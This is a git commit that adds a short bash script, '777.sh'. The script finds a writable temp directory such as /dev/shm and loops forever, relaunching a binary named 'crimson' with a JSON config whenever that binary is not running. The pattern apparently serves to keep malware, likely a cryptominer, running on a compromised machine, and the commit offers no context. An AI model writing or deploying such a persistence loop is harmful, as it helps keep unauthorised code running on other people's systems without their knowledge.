a3e43ab02e56a3cdfd42a672939a148f5ee89fbe
idkfe3d <github@easymails.cc>
2025-02-13 14:15:47 +0100

    Create 777.sh

---
+++ 777.sh
@@ -0,0 +1,18 @@
+#!/bin/bash
+
+if [ -w "/dev/shm" ]; then
+    DIR1="/dev/shm"
+elif [ -w "/var/tmp" ]; then
+    DIR1="/var/tmp"
+elif [ -w "/tmp" ]; then
+    DIR1="/tmp"
+else
+    exit 0
+fi
+
+while true; do
+    if ! pgrep -f "crimson" > /dev/null; then
+        cd "$DIR1" && exec ./crimson -c "$DIR1/axaxa.json"
+    fi
+    sleep 3
+done
